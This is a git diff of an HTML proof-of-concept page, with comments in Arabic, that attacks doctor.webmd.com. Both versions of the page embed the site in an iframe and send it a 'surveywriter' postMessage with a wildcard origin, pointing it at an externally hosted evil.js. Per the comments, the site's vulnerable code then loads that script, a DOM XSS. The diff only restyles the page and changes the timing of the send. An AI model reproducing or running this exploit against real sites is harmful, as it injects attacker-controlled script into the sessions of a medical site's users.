@@ -1,41 +1,45 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>WebMD Security Research - PoC</title>
+    <meta charset="UTF-8">
+    <title>PoC - WebMD Vulnerability Analysis</title>
+    <style>
+        body { font-family: sans-serif; background: #f0f0f0; text-align: center; padding: 20px; }
+        #status { font-weight: bold; color: #d9534f; margin-bottom: 10px; }
+        iframe { border: 5px solid #333; box-shadow: 0 0 20px rgba(0,0,0,0.2); width: 90%; height: 500px; }
+    </style>
 </head>
 <body>
-    <h1>Exploit Demo: PostMessage to RCE/XSS</h1>
-    <p>Status: <span id="status">Loading Victim Site...</span></p>
-
-    <iframe id="victimFrame" 
-            src="https://doctor.webmd.com/results?q=test" 
-            style="width: 800px; height: 600px; border: 1px solid red;">
-    </iframe>
+    <h1>Security Research: DOM XSS via PostMessage</h1>
+    <div id="status">Status: Waiting for Victim Site to load...</div>
+    
+    <iframe id="victim" src="https://doctor.webmd.com/results?q=test"></iframe>
 
     <script>
-        const status = document.getElementById('status');
-        const frame = document.getElementById('victimFrame');
+        const frame = document.getElementById('victim');
+        const statusDiv = document.getElementById('status');
 
-        // ننتظر 5 ثوانٍ لضمان تحميل سكريبتات WebMD (chunk-vendors.js) بالكامل
-        setTimeout(() => {
-            status.innerText = "Sending Exploit Payload...";
-            
-            // بناء الرسالة التي يتوقعها الكود المصاب
-            const exploitMessage = {
-                message: "surveywriter",
-                source: "https://egyhaker.github.io/webmd.com-attacker/evil.js" // رابط ملفك
-            };
+        // ننتظر حتى يتم تحميل الـ iframe بالكامل
+        frame.onload = function() {
+            statusDiv.innerText = "Target loaded. Preparing Payload...";
+            statusDiv.style.color = "#f0ad4e";
 
-            /**
-             * نرسل الرسالة إلى الـ iframe. 
-             * الكود المصاب في WebMD سيستقبلها لأن t.data.message هو "surveywriter"
-             * وسيقوم بإنشاء سكريبت جديد مصدره (src) هو ملف evil.js الخاص بك.
-             */
-            frame.contentWindow.postMessage(exploitMessage, "*");
-            
-            status.innerText = "Payload Sent! Check the iframe for an alert.";
-            status.style.color = "green";
-        }, 5000); 
+            // ننتظر 4 ثوانٍ إضافية لضمان تحميل سكريبتات chunk-vendors.js
+            setTimeout(() => {
+                const payload = {
+                    message: "surveywriter",
+                    source: "https://egyhaker.github.io/webmd.com-attacker/evil.js" // ملفك الخبيث
+                };
+
+                statusDiv.innerText = "🚀 Payload Sent! If vulnerable, an alert will pop up.";
+                statusDiv.style.color = "#5cb85c";
+
+                // إرسال الرسالة إلى نافذة WebMD
+                // نستخدم "*" لتخطي فحص الـ Origin لأن الكود المصاب لا يفحصه بشكل صحيح
+                frame.contentWindow.postMessage(payload, "*");
+                
+            }, 4000);
+        };
     </script>
 </body>
 </html>
